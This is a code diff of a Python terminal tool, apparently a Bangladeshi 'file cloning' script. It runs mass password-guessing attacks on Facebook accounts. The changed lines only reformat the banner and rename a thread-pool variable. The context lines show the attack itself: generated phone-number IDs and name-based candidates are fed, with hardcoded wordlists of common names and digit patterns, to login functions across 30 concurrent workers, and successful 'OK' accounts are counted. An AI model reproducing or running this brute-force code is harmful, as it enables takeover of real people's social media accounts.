@@ -65,18 +65,18 @@ def clear():
 #os.system("xdg-open https://www.facebook.com/profile.php?id=100092553712823 ")
 logo=("""
 \t\033[38;5;46m_____ _ _              _           
-{G}\033[38;5;46m|  __ (_) |            | |          
+\t\033[38;5;46m|  __ (_) |            | |          
 \t\033[38;5;46m| |__) || | ____ _  ___| |__  _   _ 
 \t\033[38;5;46m|  ___/ | |/ / _` |/ __| '_ \| | | |
 \t\033[38;5;36m| |   | |   < (_| | (__| | | | |_| |
 \t\033[38;5;46m|_|   |_|_|\_\__,_|\___|_| |_|\__,_|
-{R}--------------------------------------------------------------------------------------------------------------------------------
-\033[1;94m[+]\033[1;32m   CREATED BY   :  Termux-tools(HR)	    			\033[1;94m[+]
-\033[1;94m[+]\033[1;32m   ON GITHUB    :  9Team10-HR             				\033[1;94m[+]
-\033[1;94m[+]\033[1;32m  TOOL VERSION :  1.2                  						  \033[1;94m[+]
-\033[1;94m[+]\033[1;32m  NETWORK      :  4G,5G                 						 \033[1;94m[+]
-\033[1;94m[+]\033[1;32m  TOOL STATUS  :  FREE                   					  \033[1;94m[+]          			    
-\033[1;94m[+]\033[1;32m  COUNTRY      :  BANGLADESH             			   \033[1;94m[+]""")
+{R}-------------------------------------------------
+\033[1;32m  CREATED BY   :  Termux-tools(HR)	    			
+\033[1;32m  ON GITHUB    :  9Team10-HR             				
+\033[1;32m  TOOL VERSION :  1.2                  						  
+\033[1;32m  NETWORK      :  4G,5G                 						 
+\033[1;32m  TOOL STATUS  :  FREE                   					            			    
+\033[1;32m  COUNTRY      :  BANGLADESH             			   """)
 ##---------------APPROVAL------------##
 def approval():
   clear()
@@ -146,7 +146,7 @@ def file():
     print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} firstlast {R}|{G} first@@ {R}❲{G}ETC{R}❳{G}');linex()
     for i in range(ps_limit):
         plist.append(input(f"{R}❲{G}~{R}❳{G} Password No {R}❲{G}%s{R}❳{G} {R}:{G} "%(i+1)))
-    with tred(max_workers=30) as MRM:
+    with tred(max_workers=30) as HR:
         clear()
         tl = str(len(fo))
         print(f'                {R}❲{G}File Cloning{R}❳{G}');linex()
@@ -156,11 +156,11 @@ def file():
             ids,names = user.split('|')
             passlist = plist
             if methd =='1':
-                MRM.submit(api1,ids,names,passlist)
+                HR.submit(api1,ids,names,passlist)
             elif methd =='2':
-                MRM.submit(api2,ids,names,passlist)
+                HR.submit(api2,ids,names,passlist)
             else:
-                MRM.submit(api1,ids,names,passlist)
+                HR.submit(api1,ids,names,passlist)
             
     print(f'\r{R}--------------------------------------------------')
     print(f"{R}❲{G}~{R}❳{G} Cloning Hasbeen Completed ")
@@ -194,7 +194,7 @@ def bd():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [ids[:8],ids[:7],ids[:6],ids[5:],ids[3:],ids[4:],ids[2:],ids,'i love you','iloveyou','alamin','nabila','halima','jannat','ariyan','nadiya','trisha','@@@###','fflover','sadiya','sabbir','sanjida','sumaiya','bangladesh','fariya','113355','shahin','nusrat','jesmin','ayesha','saiful','saidul','nazmul','112200','121234','506070','708090','203040','sarmin','mahadi','aaabbb']
-                                MRM.submit(rd1,ids,passlist)
+                                HR.submit(rd1,ids,passlist)
                 print(f'\r{R}--------------------------------------------------')
                 print(f"{R}❲{G}~{R}❳{G} Cloning Hasbeen Completed ")
                 print(f'{R}❲{G}~{R}❳{G} TOTAL OK ID {R}:{G} '+str(len(oks)))
@@ -228,7 +228,7 @@ def ind():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx[2:],psx,code+psx,code+psx[:3],'57273200','59039200','57575751']
-                                MRM.submit(rd1,ids,passlist)
+                                HR.submit(rd1,ids,passlist)
                 print(f'\r{R}--------------------------------------------------')
                 print(f"{R}❲{G}~{R}❳{G} Cloning Hasbeen Completed ")
                 print(f'{R}❲{G}~{R}❳{G} TOTAL OK ID {R}:{G} '+str(len(oks)))
@@ -285,7 +285,7 @@ def gmail():
                                 fs = first_name.lower()
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12',fs+'@@',fs+'@@@@']
-                                MRM.submit(rd1,ids,passlist)
+                                HR.submit(rd1,ids,passlist)
                 print(f'\r{R}--------------------------------------------------')
                 print(f"{R}❲{G}~{R}❳{G} Cloning Hasbeen Completed ")
                 print(f'{R}❲{G}~{R}❳{G} TOTAL OK ID {R}:{G} '+str(len(oks)))
